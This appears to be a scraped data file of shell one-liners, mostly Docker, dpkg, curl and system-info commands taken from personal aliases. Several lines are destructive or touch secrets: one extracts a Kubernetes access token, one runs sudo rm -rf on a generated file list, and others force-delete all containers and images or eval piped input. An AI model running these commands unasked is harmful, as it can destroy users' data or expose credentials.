dpkg -l | grep ^rc | awk '{print $2}' | xargs sudo dpkg -P
dpkg -l | grep ^ii | awk '{print \$2}' | grep
dpkg -l | grep '^rc' | awk '{print $2}' | xargs sudo dpkg --purge
dpkg -l | grep '^.i' | awk '{print $2}' | wc -l
dpkg -l | egrep -q ^rc && dpkg -l | awk '/^rc/ { print \$2 }' | xargs sudo dpkg --purge
dpkg -L fortunes-es | grep dat | xargs -I{} basename {} .dat | xargs fortune
dpkg --get-selections|grep 'linux-image*'|awk '{print $1}'|egrep -v \
dot-profile | dot-git | dot-motd | dot-vim
done | column -t -s""%"" | sort -nr | cut -d "":"" -f 2"
dockerps|xargs docker stop&&dockerps|xargs docker rm&&dockerimages|xargs docker rmi
docker-compose kill && docker ps -a | tail -n +2 | cut -d ' ' -f 1 | xargs docker rm
docker volume ls --quiet --filter name=${{cookiecutter.envvar_prefix|lower}}_container_prefix | sed s/${{cookiecutter.envvar_prefix|lower}}_container_prefix//
docker stop $(docker ps -a | grep -v dropbox | grep -v CONTAINER | awk
docker service ls | grep -v REPLICAS | awk '{print $1}' | xargs docker service rm
docker rmi \$( docker images -a | grep '<none>' | tr -s ' ' | cut -d ' ' -f 3)
docker rmi -f $(docker images | grep 'ago' | tr -s ' ' | cut -d ' ' -f 3)
docker rmi $(docker images|grep '<none>'|tr -s ' '|cut -d ' ' -f 3)
docker rmi $( sudo docker images | grep '<none>' | tr -s ' ' | cut -d ' ' -f 3)
docker rm $(docker ps -a | grep -v dropbox | grep -v CONTAINER | awk
docker ps | tail -n+2 | selecta | cut -d' ' -f1
docker ps | tail -n +2 | sed 's/\s\+/ /g' | cut -d' ' -f2
docker ps | tail -n +2 | cut -f1 -d' ' | xargs docker kill
docker ps | tail -n +2 | awk '{ print \$1 }' | xargs docker kill
docker ps | grep java7-oom | cut -d' ' -f1 | xargs docker stats
docker ps | grep hours | awk '{print $1}' | xargs docker kill
docker ps | grep -v CONTAINER | awk '{print$1}' | xargs docker stop -t 5
docker ps | grep -v 'CONTAINER ID' | fzf | awk '{print \$1}'
docker ps | grep '[a-z0-9]' | awk '{ print $1 }' | xargs docker kill
docker ps | cut -d ' ' -f 1 | grep -v CONTAINER | xargs docker stop
docker ps | cut -d ' ' -f 1 | grep -v CONTAINER | xargs docker kill
docker ps | awk '{print \$1}' | tail -n +2 | xargs docker update --restart=no
docker ps | awk '{print \$1}' | tail -n +2 | xargs docker kill
docker ps | awk '{print \$1}' | tail -n +2 | xargs -n1 -P4 docker kill
docker ps | awk '{print $1}'| grep -v CONTAINER | xargs docker stop
docker ps | awk '{print $1}' | grep -v CONT | xargs docker kill
docker ps | awk '{ print \$1 }' | grep -v '^CONTAINER' | xargs docker stop
docker ps -q | xargs docker kill; docker ps -aq | xargs docker rm; docker images -q --filter dangling=true | xargs docker rmi; docker volume prune -f
docker ps -a|grep Exit| awk '{print \$1}'|xargs docker rm && docker rmi \$(docker images -f
docker ps -a|grep Exited|awk '{print \$1}'|xargs -i docker rm {}
docker ps -a |rg -v CONTAINER |awk '{print \$1}' |xargs docker rm -f
docker ps -a |grep Exited | cut -d ' ' -f1 | xargs docker rm
docker ps -a |grep Created | cut -d ' ' -f1 | xargs docker rm
docker ps -a |grep 'Exited' |awk '{print $1}' |xargs docker rm
docker ps -a | xargs docker stop | xargs docker rm && docker images -qa | xargs docker rmi -f && docker system prune
docker ps -a | tr -s ' ' | cut -f 1 -d ' ' | grep -v
docker ps -a | tail +2 | cut -d ' ' -f1 | xargs docker rm
docker ps -a | tail +2 | awk '{print \$1}' | xargs sudo docker rm
docker ps -a | peco | awk '{ print $1; }' | xargs docker stop
docker ps -a | grep _run_ | awk '{print \$1}' | xargs docker rm
docker ps -a | grep Exited | cut -d ' ' -f 1 | xargs docker rm
docker ps -a | grep Exited | awk '{print \$1}' | xargs docker rm -v
docker ps -a | grep Exited | awk '{print \$1}' | xargs docker rm
docker ps -a | grep Exited | awk '{print $1}' | xargs docker rm
docker ps -a | grep Exited | awk '{ print \$1; }' | xargs -n1 docker rm
docker ps -a | grep Exited | awk '{ print \$1 }' | xargs docker rm
docker ps -a | grep Exit | cut -d ' ' -f1 | xargs docker rm
docker ps -a | grep Exit | cut -d ' ' -f 1 | xargs sudo docker rm ;docker system prune -af
docker ps -a | grep Exit | cut -d ' ' -f 1 | xargs sudo docker rm
docker ps -a | grep Exit | cut -d ' ' -f 1 | xargs docker rm -f
docker ps -a | grep Exit | cut -d ' ' -f 1 | xargs docker rm
docker ps -a | grep -vi container | awk '{print $1}' | xargs docker rm -f
docker ps -a | grep -v NAMES | awk '{print \$NF}' | xargs -I {} docker rm {}
docker ps -a | grep -v CONTAINER | awk '{print $1}' | xargs docker rm --force
docker ps -a | grep -v 'CONTAINER ID' | sk | awk '{print \$1}'
docker ps -a | grep -v 'CONTAINER ID' | fzf | awk '{print \$1}'
docker ps -a | grep -i exit | awk '{print \$1}' | xargs docker rm
docker ps -a | grep -Eiv Up | cut -d ' ' -f 1 | xargs docker rm
docker ps -a | grep 'weeks ago' | awk '{print \$1}' | xargs docker rm
docker ps -a | grep 'weeks ago' | awk '{print $1}' | xargs docker rm
docker ps -a | grep 'weeks ago' | awk '{print $1}' | xargs --no-run-if-empty docker rm
docker ps -a | grep 'months ago' | awk '{print $1}' | xargs --no-run-if-empty docker rm
docker ps -a | grep 'days ago' | awk '{print $1}' | xargs docker rm
docker ps -a | grep 'ago' | awk '{print $1}' | xargs --no-run-if-empty docker rm -f && docker ps -a
docker ps -a | grep '^[0-9a-f]' | awk '{print $1}' | xargs docker rm -vf
docker ps -a | grep 'Exited' | cut -f1 -d\ | xargs --no-run-if-empty docker rm
docker ps -a | grep 'Exited' | awk '{print \$1}' | xargs docker rm
docker ps -a | grep 'Exited' | awk '{print $1}' | xargs docker rm
docker ps -a | grep 'Exit' | awk '{print \$1}' | xargs -r sudo docker rm
docker ps -a | grep 'Exit' | awk '{print $1}' | xargs docker rm
docker ps -a | grep ' ago' | awk '{print $1}' | xargs docker rm
docker ps -a | fzf -m | awk '{print $1}' | xargs docker rm
docker ps -a | cut -f1 -d' ' | tail -n +2 | xargs docker rm
docker ps -a | cut -d ' ' -f1 | tail -n +2 | xargs docker rm
docker ps -a | cut -d ' ' -f 1 | xargs docker stop | xargs docker rm
docker ps -a | cut -d ' ' -f 1 | egrep -v CONTAINER | xargs docker rm -f
docker ps -a | awk '{print $1}' | tail -n +2 | xargs docker rm -f
docker ps -a | awk '{print $1}' | grep -v CONTAINER | xargs docker rm -f
docker ps -a | awk '{print $1}' | grep -v CONTAINER | xargs docker rm
docker ps -a -q|xargs -r docker rm; docker images -q -f dangling=true|xargs -r docker rmi; docker volume ls -qf dangling=true|xargs -r docker volume rm
docker ps -a -q | xargs docker stop && docker ps -a -q | xargs docker rm && docker images -a -q | xargs docker rmi -f
docker ps -a -notrunc| grep 'Exit' | awk '{print \$1}' | xargs docker rm
docker ps -a -notrunc| grep 'Exit' | awk '{print \$1}' | xargs -L 1 -r docker rm
docker ps -a -notrunc | grep 'Exit' | awk '{print $1}' | xargs -r docker rm
docker ps -a -no-trunc | grep 'Exit' | awk '{print \$1}' | xargs -L 1 -r docker rm
docker ps -a --no-trunc| grep 'Exit' | awk '{print \$1}' | xargs -L 1 docker rm
docker ps -a --no-trunc| grep 'Exit' | awk '{print \$1}' | xargs -L 1 -r docker rm
docker ps -a --no-trunc | grep -v CONTAINER | awk '{print \$1}' | xargs -r docker stop
docker ps -a --no-trunc | grep 'Exit' | awk '{print \$1}' | xargs -r docker rm
docker ps -a --no-trunc | grep 'Exit' | awk '{print \$1}' | xargs -L 1 -r docker rm
docker ps -a --no-trunc | grep 'Exit' | awk '{print $1}' | xargs docker rm
docker ps -a --no-trunc | grep 'Created' | awk '{print \$1}' | xargs -r docker rm
docker ps --format '{{.ID}}: {{.Image}} {{.Names}}' | peco | sed 's/: .*//g' | xargs -I{} -ot docker rm -f {}
docker ps --format '{{.ID}}: {{.Image}} {{.Names}}' | peco | sed 's/: .*//g' | xargs -I{} -ot docker logs -f {}
docker ps --format '{{.ID}}: {{.Image}} {{.Names}}' | peco | sed 's/: .*//g' | xargs -I{} -ot docker exec -ti {} /bin/sh
docker ps --format '{{.ID}}: {{.Image}} {{.Names}}' | peco | sed 's/: .*//g' | xargs -I{} -ot docker exec -ti {} /bin/bash
docker ps --format 'table {{.Names}} {{.Status}} {{.ID}}' | sed 's/dev_//' | sed 's/_1/_1 /' | sort
docker ps --filter status=exited -q | xargs docker rm 2> /dev/null || echo 'No containers to remove'
docker ps --filter 'status=exited' | grep 'weeks ago' | awk '{print $1}' | xargs --no-run-if-empty docker rm
docker ps --all | tail -n+2 | grep -oE '^[^ ]+' | xargs -I % bash -c 'docker kill %; docker rm %'
docker ps --all | grep Exited | awk '{print \$1}' | xargs docker rm
docker ps --all | grep '^[0-9a-z]' | sed -e 's/ .*//g' | xargs docker rm
docker network ls -q | xargs docker inspect | jq '.[] | select(.Name != \
docker images|grep none|awk '{print \$3}'|xargs -i docker rmi {}
docker images | tr -s ' ' | cut -f 3 -d ' ' | grep -v
docker images | sed 1d | awk '{print $3}' | xargs docker rmi --force
docker images | peco | awk '{ print $3 }' | xargs docker rmi
docker images | head -n 2 | tail -n 1 | awk '{print \$3}'
docker images | grep weeks | awk '{print $3}' | xargs docker rmi -f
docker images | grep none | cut -c 47-59 | xargs docker rmi
docker images | grep none | awk {'print $3'} | xargs docker rmi
docker images | grep none | awk '{print \$3}'| xargs docker rmi
docker images | grep none | awk '{print \$3}' |xargs docker rmi
docker images | grep none | awk '{print \$3}' | xargs docker rmi
docker images | grep none | awk '{print $3}' | xargs docker rmi -f
docker images | grep none | awk '{print $3}' | xargs docker rmi
docker images | grep none | awk '{print $3}' | xargs docker rm
docker images | grep none | awk '{print $3 }' | xargs docker rmi
docker images | grep none | awk '{ print \$3 }' | xargs docker rmi
docker images | grep none | awk '{ print $3; }' | xargs docker rmi
docker images | grep none | awk '{ print $3 }' | xargs -n1 docker rmi
docker images | grep \<none\> | awk '{print \$3}' | xargs docker rmi
docker images | grep -v REPOSITORY | awk '{print \$1}' | xargs -L1 docker pull
docker images | grep -v 'REPOSITORY' | sk | awk '{print \$2}'
docker images | grep -v 'REPOSITORY' | fzf | awk '{print \$1}'
docker images | grep -i '<none>' | awk '{print \$3}' | xargs docker rmi
docker images | grep 'none' | awk '{print $3}' | xargs docker rmi
docker images | grep 'amazonaws.com' | awk '{print \$3}' | xargs docker rmi
docker images | grep '^<none>' | awk '{print \$3}' | xargs docker rmi
docker images | grep '^<none>' | awk '{print \$3}' | xargs -n1 -I{} docker rmi '{}'
docker images | grep '^<none>' | awk '{print $3}' | xargs docker rmi
docker images | grep '^<none>' | awk '{print $3}' | xargs --no-run-if-empty docker rm
docker images | grep '<none>' | grep -P '[1234567890abcdef]{12}' -o | xargs -L1 docker rmi
docker images | grep '<none>' | awk {'print $3'} | xargs -n 1 docker rmi
docker images | grep '<none>' | awk '{print \$3}' | xargs docker rmi
docker images | grep '<none>' | awk '{print $4}' | xargs docker rmi
docker images | grep '<none>' | awk '{print $3}' | xargs docker rmi -f
docker images | grep '<none>' | awk '{print $3}' | xargs docker rmi
docker images | grep '<none>' | awk '{print $3}' | gxargs --no-run-if-empty docker rmi -f
docker images | grep '<none>' | awk '{ print \$3 }' | xargs docker rmi
docker images | g '^<none>' | awk '{print \$3}' | docker rmi
docker images | fzf -m | awk '{print \$3}' | xargs docker rmi -f
docker images | fzf -m | awk '{print \$3}' | xargs docker rmi
docker images | fzf -m | awk '{print $3}' | xargs docker rmi
docker images | awk '{print $3}' | grep -v IMAGE | xargs docker rmi
docker images -q | sort | uniq | xargs docker rmi -f
docker images -notrunc| grep none | awk '{print $3}' | xargs -r docker rmi
docker images -f dangling=true | tail -n+2 | cut -c41-52 | xargs -I {} docker rmi {}
docker images -a | grep none | awk '{print \$3}' | xargs -L 1 -r docker rmi
docker images -a | grep '^<none>' | awk '{print $3}' | xargs --no-run-if-empty docker rmi
docker images -a | grep '^<none>' | awk '{ print \$3 }' | xargs docker rmi -f
docker images -a | grep '<none>' | awk '{print \$3}' | xargs docker rmi 2>/dev/null
docker images -a | grep '<none>' | awk '{print \$3}' | xargs docker rmi
docker images -a -notrunc | grep none | awk '{print \$3}' | xargs docker rmi
docker images -a -notrunc | grep none | awk '{print \$3}' | xargs -L 1 -r docker rmi
docker images -a -no-trunc | grep none | awk '{print \$3}' | xargs -L 1 -r docker rmi
docker images -a --no-trunc | grep none | awk '{print \$3}' | xargs -L 1 docker rmi
docker images -a --no-trunc | grep none | awk '{print \$3}' | xargs -L 1 -r docker rmi
docker images -a --no-trunc | grep '^<none>' | awk '{print \$3}' | xargs -L 1 -r docker rmi
docker images --no-trunc | grep none | awk '{print \$3}' | xargs -r docker rmi
docker images --no-trunc | grep none | awk '{print $3}' | xargs docker rmi
docker images --no-trunc | grep '<none>' | awk '{ print \$3 }' | xargs docker rmi
docker images --no-trunc | grep '<none>' | awk '{ print \$3 }' | xargs -r docker rmi
docker images --no-trunc | grep '<none>' | awk '{ print $3 }' | xargs docker rmi
docker images --no-trunc | grep '<none>' | awk '{ print $3 }' | xargs -r docker rmi"
docker images --no-trunc | grep '<none>' | awk '{ print $3 }' | xargs -r docker rmi
docker images --filter dangling=true -q | xargs docker rmi 2> /dev/null || echo 'No images to remove'
docker image ls | head -n 2 | tail -n 1 | awk '{print \$3}'
docker image ls | head -n 1; docker image ls | tail -n +2 | sort
docker image ls | grep none | awk '{print $3}' | xargs docker rmi -f
docker container ls | grep codeheures/php-fpm:v1 | grep selfjob_ | awk
docker container ls | grep codeheures/php-fpm:v1 | grep codeheures_ | awk
docker container ls | grep codeheures/npm:v1 | grep selfjob_ | awk
docker container ls | grep codeheures/npm:v1 | grep codeheures_ | awk
docker container ls | grep codeheures/laravel-echo:v1 | grep selfjob_ | awk
docker container ls | grep codeheures/angular:v1 | grep lab_ | awk
docker container ls | grep 'bitbucket' | awk '{print $1;}' | xargs docker kill
do-release-upgrade -d -f DistUpgradeViewNonInteractive; apt-get update; apt-get upgrade -y; apt-get clean; apt-get autoclean -y; composer global self-update; composer global update; composer global clear-cache; npm install npm -g; npm update -g; npm cache clean; pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U; rm -rf ~/.pip/cache/; gem update --system; gem update; gem cleanup; yarn global upgrade
dmesg -H || dmesg | less
dkm -a --no-trunc | grep none | awk '{print \$3}' | xargs -L 1 -r docker rmi
dkcls | grep Exited | cut -d\ -f1 | xargs docker container rm
dkc -a --no-trunc| grep Exit | awk '{print \$1}' | xargs -L 1 -r docker rm
dk ps | tail -n +2 | fzf | awk
dirs -v | sort -k 2 | uniq -f 1 | sort
dirs -v | head | tr '\t' ' ' | coat
df / | awk ' /dev/ {print \$1}' | sudo su -c 'xargs tune2fs -l' | grep create
df -h|egrep '^(Filesystem|/)'| sort -hk5
df -hl | grep -v Filesystem | sort | egrep -i '[0-9]+%'
df -h |grep /media |cut -b 26- | sort
df -h | head -1; df -h | tail --lines=+2 | sort
df -h | grep -v tmpfs | grep -Ev '^(dev|run)'
df -h / --output=avail | tail -1 | xargs echo | sed 's/G/ GB/g'
df -Ph | sed 's/Mounted on/Mounted_on/' | column -t | sed 's/Mounted_on/Mounted on/'
df -H | grep -vE '^Filesystem|tmpfs|cdrom'
deluge-console info --sort=state | grep -E 'Name:.*$|$' --color=always | less -R
degrep --null-data '\/(\.hg|\.git|\.svn|CVS)'
degrep '\/(\.hg|\.git|\.svn|CVS)'
declare -F | awk '{print \$3}' | grep -v '^_' | grepeco
ddev list | grep running | cut -f1 -d' ' | xargs ddev stop
dd if=/dev/urandom count=1 bs=48 2>/dev/null|uuencode -m -|tail -2|head -1
dd if=/dev/urandom count=1 2>/dev/null | base64 | head -1 | cut -c4-15
dd if=/dev/urandom count=1 2> /dev/null | uuencode -m – | sed -ne 2p | cut -c -16
dd if=/dev/urandom count=1 2> /dev/null | uuencode -m - | sed -ne 2p | cut -c-40
dd if=/dev/urandom count=1 2> /dev/null | uuencode -m - | sed -ne 2p | cut -c-16
dd if=/dev/random count=1 2> /dev/null | uuencode -m - | sed -ne 2p | cut -c-12
dbusers | grep -v postgres | iselect -am | xargs -n1 dropuser -i
date;svn status | sort | ack -v '^X ' | ack '^ ?. '
date +%s-%N | shasum -a 256 | base64 | head -c 32 ; echo
date +%s-%N | sha256sum | base64 | head -c 32 ; echo
date +%s | shasum | base64 | head -c 32 ; echo
date +%s | shasum | base64 | head -c 16 ; echo
date +%s | shasum -a 256 | base64 | head -c 64 ; echo
date +%s | shasum -a 256 | base64 | head -c 32 ; echo
date +%s | sha256sum | base64 | head -c 32 ; echo
date +%s | sha256sum | base64 | head -c 10 ; echo
date +%s | sha224sum | base64 | head -c 12 ; echo
date +%s | gsha256sum | base64 | head -c 10
cygpath -w $(pwd) | sed 's/\\\/\\//g' | tr -d \\\n | clip
cvs status|grep ^?|sed s/?//|xargs cvs add $1
cvs status | grep -v Examining | grep Status: | grep -v Up-to-date
cvs st | grep -E 'Locally|Patch|Merged'
cvs -qn update | grep ^? | cut -c3- | xargs cvs add
cvs -q diff -N --brief | grep '^\(Index\|\?\)' | sed 's/^Index: \(.*\)/M \1/'
cut -d: -f1 | grep -v Binary | sort | uniq
cut -d'(' -f2|rmVer|sort -u|uniq
cut -d '/' -f2 | cut -d '.' -f1 | grep -v imsmanifest | nl2c
cut -d ' ' -f2 | base64 -D | md5 | sed 's/../&:/g; s/:$//'
current_path=$(pwd) && cd $KRATOS_PATH/scripts && unbuffer sh configure.sh 2>&1 | tee kratos.compile.log && cd $current_path || cd $current_path
curl wttr.in/Chicago | head -27 | tail -10 | lolcat
curl wttr.in | tac | tac | head -n 7
curl ipinfo.io -s | jq && curl ifconfig.co/json -s | jq && curl ifconfig.me/all.json -s | jq
curl https://api.github.com/users/nasum/repos | jq -r '.[].clone_url' | peco | xargs ghq get
curl http://mensa.akk.uni-karlsruhe.de/ -d DATUM=heute -d uni=1 -d schnell=1 -s | w3m -dump -T text/html| head -n 25 | tail -n 18
curl http://lon1uat1app001.ccycloud.com:18080/pricing/status.json | python -m json.tool | head -28 | tail -24
curl http://lon1demoapp002.ccycloud.com:18080/pricing/status.json | python -m json.tool | head -28 | tail -24
curl http://localhost:38080/pricing/status.json | python -m json.tool | head -28 | tail -24
curl -s randomfunfacts.com | grep strong | cut -d\> -f5- | cut -d\< -f1
curl -s localhost:5015/healthz | jq . | grep version | sed 's/\
curl -s ipecho.net/plain | rev | cut -c1- | rev
curl -s https://www.archlinux.org/feeds/news/ | xmllint --xpath //item/title\ \|\ //item/pubDate /dev/stdin | sed -r -e \
curl -s https://www.archlinux.org/feeds/news/ | xmllint --xpath //item/title\ \|\ //item/pubDate /dev/stdin | sed -r -e 's:<title>([^<]*?)</title><pubDate>([^<]*?)</pubDate>:\2\t\1\n:g'
curl -s https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english-no-swears.txt | shuf --random-source=/dev/urandom | head -n 4 | tr '\n' ' '; echo
curl -s https://check.torproject.org | cat | grep -m 1 Congratulations | xargs
curl -s http://usatoday30.usatoday.com/exp/kanye/js/kanye.js | head -n 27 | sed -n 's|\[\
curl -s http://cdec.water.ca.gov/cgi-progs/reservoirs/RES | grep 'Group Average' | cut -d '>' -f 25 | cut -d '<' -f 1
curl -s http://cbsg.sourceforge.net/cgi-bin/live | grep -Eo '^<li>.*</li>' | sed 's/<[^>]*>//g' | shuf -n 1
curl -s bcps.org| hxnormalize -x | hxselect '#status' | w3m -dump -T 'text/html'
curl -s -F 'sprunge=<-' http://sprunge.us | head -n 1 | tr -d '\r\n ' | y
curl -s 'https://www.random.org/passwords/?num=1&len=15&format=plain&rnd=new' | sed 's/.../&-/g;s/-$//' | tr -d '\n' | pbcopy; pbpaste; echo
curl -s 'https://www.archlinux.org/mirrorlist/?country=BR&protocol=http&protocol=https&ip_version=4&ip_version=6&use_mirror_status=on' | sed -e 's/^#Server/Server/' -e '/^#/d' | rankmirrors - | _ tee /etc/pacman.d/mirrorlist
curl -Is slashdot.org | egrep '^X-(F|B)' | cut -d \- -f 2
curl -I https://fac.freeagent.com/ 2>/dev/null | grep -E 'X-(Rev)' | cut -d ' ' -f2 | dos2unix
curl --compressed -s 'http://stream.pushshift.io/' | grep data | cut -c 7- | jq . -c
curl $SERVERLESS_GOOF_HOST/dev/todos/ | jq '.[]|.id' | cut -d'
ctags -e `find (app|spec|lib|config)/**/*.rb`
ctags -e \`find (app|spec|lib|config)/*/.rb\`
cscope -bcvR **/*.(c|h|cpp|cc)
crontab -l | grep -v '^#' | cut -f 6- -d ' ' | while read CMD; do eval $CMD; done
cpufreq-info | grep -P 'comprise entre|actuelle' | grep -e '[0-9.]*'
cozy-stack instances ls | grep test | awk '{ print \$1 }' | xargs -n1 cozy-stack instances rm --force
cowsay -f $(ls /usr/share/cowsay/cows | shuf -n 1 | cut -d. -f1) $(whatis $(ls /bin) 2>/dev/null | shuf -n 1)
cowsay -f $(ls /usr/local/share/cows | gshuf -n 1 | cut -d. -f1) $(whatis $(ls /bin) 2>/dev/null | gshuf -n 1)
convert -list font | grep Font | sort -R | head -1
config | fgrep inet | fgrep netmask | awk '{print $2}'
complete -p | sed -e's/.* \([^ ]\+\)/\1/' | sort | less
compgen -A function -abck|sort|uniq|less
commandhistory | sort | uniq -c | sort -n
command_exists fortune && command_exists cowsay && command_exists lolcat && fortune | cowsay -f $(ls /usr/local/Cellar/cowsay/3.03/share/cows | shuf | sed -n
command pip3 freeze --local | command grep -v '^\\-e' | command cut -d = -f 1 | command xargs -n1 pip install -U
command fortune -a | fmt -80 -s | $(shuf -n 1 -e cowsay cowthink) -$(shuf -n 1 -e b d g p s t w y) -f $(shuf -n 1 -e $(cowsay -l | tail -n +2)) -n
comm -23 <(sudo find / \( -path '/dev' -o -path '/sys' -o -path '/run' -o -path '/tmp' -o -path '/mnt' -o -path '/srv' -o -path '/proc' -o -path '/boot' -o -path '/home' -o -path '/root' -o -path '/var/lib/pacman' -o -path '/var/cache/pacman' -o -path '/var/cache/man' -o -path '/var/db/sudo/$USER' -o -path '/lost+found' \) -prune -o -type d -print | sed 's/\([^/]\)$/\1\//' | sort -u) <(pacman -Qlq | sort -u)
comm -23 <(sudo find / \( -path '/dev' -o -path '/sys' -o -path '/run' -o -path '/tmp' -o -path '/mnt' -o -path '/srv' -o -path '/proc' -o -path '/boot' -o -path '/home' -o -path '/root' -o -path '/media' -o -path '/var/lib/pacman' -o -path '/var/cache/pacman' \) -prune -o -type d -print | sed 's/\([^/]\)$/\1\//' | sort -u) <(pacman -Qlq | sort -u)
comm -23 <(sudo find / \( -path '/dev' -o -path '/sys' -o -path '/run' -o -path '/tmp' -o -path '/mnt' -o -path '/srv' -o -path '/proc' -o -path '/boot' -o -path '/home' -o -path '/root' -o -path '/media' -o -path '/var/lib/pacman' -o -path '/var/cache/pacman' \) -prune -o -type d -print | sed 's/\([^/]\)$/\1\//' | sort -u ) <(pacman -Qlq | sort -u)
comm -23 <(pacman -Qqt | sort) <(pacman -Sqg base base-devel | sort) | grep -v xorg
comm -23 <(pacman -Qqm | sort) <(curl https://aur.archlinux.org/packages.gz | gzip -cd | sort)
comm -23 <(pacman -Qqett | sort) <(pacman -Qqg base -g base-devel | sort | uniq)
comm -23 <(pacman -Qqett | sort) <(pacman -Qqg -g base-devel | sort | uniq)
comm -23 <(comm -23 <(apt-mark showmanual | sort -u) <(cat /usr/local/share/base-packages.list | sort -u)) <($HOME/.dotfiles/postinstall/debian-bootstrap list | sort -u)
comm -23 <(apt-mark showmanual | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n 's/^Package: //p' | sort -u)
comm -23 <(apt-mark showauto | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n 's/^Package: //p' | sort -u)
comm -23 <((pacman -Qqe; echo ${GROUP_LIST} | tr ' ' '\n') | sort) <(pacman -Qqg ${GROUP_LIST} | sort)
cmd=`which mmencode || which mimencode`; head -c 6 /dev/urandom | $cmd
clippaste | sq | comma | clipcopy && pline
clippaste | sort -n | uniq | clipcopy && pline
clippaste | paren | comma | clipcopy && pline
clear; tasklist | grep 'Console' | sort -r -k 4 | awk '{ printf \
clear; seq 50 | sort -R | sparkly | lolcat;
clear; seq 1 $(tput cols) | sort -R | spark | lolcat -a -d 25; clear;
clear; echo; seq 1 $(tput cols) | sort -R | spark | lolcat; echo;
clear; echo; echo; seq 1 $(tput cols) | sort -R | spark | lolcat; echo; echo
clear; echo; echo; seq 1 $(tput cols) | gsort -R | spark | lolcat; echo; echo
clear; # echo; echo; seq 1 $(tput cols) | sort -R | sparkar | lolcat; echo; echo
clear && tree .. -L 3 -I 'node_moduels|components|build|target' --filelimit 12 -C
clear && tree -L 3 -I 'node_moduels|components|build|target' -C
chuck -a | fmt -80 -s | $(shuf -n 1 -e cowsay cowthink) -$(shuf -n 1 -e b d g p s t w y) -f $(shuf -n 1 -e $(cowsay -l | tail -n +2)) -n
cgitroot ; git status --porcelain=v1 -z | grep -zZ '^M[ MD] ' | sed -z 's/^...//' | xargs -0 --no-run-if-empty git reset HEAD -- ; cd -
cgitroot ; git status --porcelain=v1 -z | grep -zZ '^A[ MD] ' | sed -z 's/^...//' | xargs -0 --no-run-if-empty git reset HEAD -- ; cd -
cd ~/sprot/everlaw && cd $(ls -d */ | tail -n1) && cd $(ls -d */ | tail -n1) && cd $(ls -d */ | tail -n1)
cd ~/shell/writing/; ls; cd $(ls -lt | grep ^d | head -1 | cut -b 45-)
cd ~/Projects/dooku; ./quote | xmllint --xpath 'string(//aggregatorResponse/quote/link)' - | sed 's/entrypoint.website.playground.internal.qmetric.co.uk/localhost:8086/' | xargs open -a \
cd ~/Projects/Cornell/frenetic/frenetic/vagrant && (vagrant status | (grep 'running' || vagrant up) && vagrant ssh)
cd node_modules 2> /dev/null && cd .. && echo '/*' > node_modules/.gitignore && echo '!/.gitignore' >> node_modules/.gitignore && npm ls --prod --parseable 2> /dev/null | grep node_modules | grep -vE 'node_modules.*node_modules' | sed 's/.*node_modules/!/' >> node_modules/.gitignore
cd `pwd | sed -E s/api.*\|client.*\|common.*//`
cd `find /mnt/c/Users/ -type d -maxdepth 2 | grep -i desktop | grep -vi default | grep -vi public`
cd \$( ls -al | grep ^d|peco| awk -F' ' '{print \$9}' )
cd ./\$(grep -lr 'Needs Grading' s*/s*.txt | sort -R | cut -d'/' -f1 | head -1)
cd ../../ && pwd; echo; echo; seq 1 $(tput cols) | sort -R | sparkar | lolcat; echo; echo
cd .. && pwd; echo; echo; seq 1 $(tput cols) | sort -R | sparkar | lolcat; echo; echo
cd (cat ~/Library/autojump/autojump.txt | sort -nr | awk '{print \$2}' | fzf +s)
cd $({ git rev-parse --git-dir 2>&- || echo .; } | xargs dirname)
cd $(ls -lt | grep ^d | head -1 | cut -b 45-)
cd $(ls -lart | tail -2 | head -1 | awk '{print $9}')
cd $(ghq list -p | {peco || pwd;})
cd $(find ~/.vim/plugged -maxdepth 1 -type d | {peco || pwd;})
cd $( ls -lt | grep d | head -1 | cut -b 49- )
catup | grep -o ' .*)' | grep -o '[a-z][a-z]*' | cat
cat ~/tmp/zabbix.status | egrep -v 'PROBLEM ACK' | sed -e 's#PROBLEM NACK ##' | clog
cat ~/Brewfile | grep '^[a-z]' | sed -e 's/^/brew /' | bash -x
cat ~/.zshrc | grep alias | sort | sed -e \
cat ~/.zshrc | grep -v '#' | grep alias | grep
cat ~/.ssh/config | grep '^Host ' | awk '{print $2}' | tr '\r' '\n'
cat ~/.kube/config|grep current-context|cut -d' ' -f2|sed -e 's/^.*_//g'
cat ~/.kube/config | grep -o 'access-token:.*' | cut -d' ' -f2 | pbcopy
cat ~/.config/i3/config|grep bindsym|highlight -S sh --out-format=ansi|less
cat ~/.config/emoji | peco | sed -e 's/^\(.\).*/\1/' | pbcopy
cat ~/.config/batmanBefore.txt; acpi | grep '[0-9 ][0-9]%' -o | head -1 | tr -d '\n'; cat ~/.config/batmanAfter.txt
cat ~/.bash_history | cut -d' ' -f1 | frequency | head -n 20
cat ~/.bash/alias.bash | grep git | cut -d ' ' -f 2- | sed '$ d'
cat | nkf -e | chasen | nkf -w
cat | nkf -e | cabocha -f1 | nkf -w
cat updatelog | xargs -I{} pacman -Qo {} 2>&1 | sed 's/^error:.*owns //g' > noowner && cat noowner | xargs sudo rm -rf
cat requirements.txt | grep = | cut -d = -f 1 | xargs pip install -U
cat config/database.yml | grep database | grep -v '#' | grep -v production
cat Eofile | tr '\n' ' ' | sed 's/.$/\n/' | xargs sudo eopkg install
cat <(brew outdated) <(brew leaves) | sort | uniq -d | xargs brew upgrade
cat <(brew outdated) <(brew leaves) | sort | uniq -d | grep -f - --color=never <(brew outdated -v)
cat /var/log/pacman.log | grep -iE 'installed|upgraded' | fzf -e +s --reverse
cat /var/log/nginx/access.log | column -t | cut -b -20 | sort --unique
cat /sys/class/thermal/thermal_zone0/temp | echo $(cat) / 1000 | bc | echo $(cat) °C
cat /proc/meminfo | grep MemTotal | cut -d: -f2 | cut -dk -f1
cat /proc/meminfo | grep MemFree | cut -d: -f2 | cut -dk -f1
cat /proc/cpuinfo | grep vendor | uniq | awk '{print \$3}'
cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c
cat /proc/cpuinfo | grep Serial | awk ' {print $3}' | xclip -sel clip"
cat /proc/cpuinfo | grep MHz | cut -f2 -d: | uniq -
cat /proc/cpuinfo | grep 'model name' | uniq | cut -d' ' -f3-
cat /home/$USER/.bash_aliases | grep '^alias' | sed 's/alias //g' | grep -e '^[^=]*'
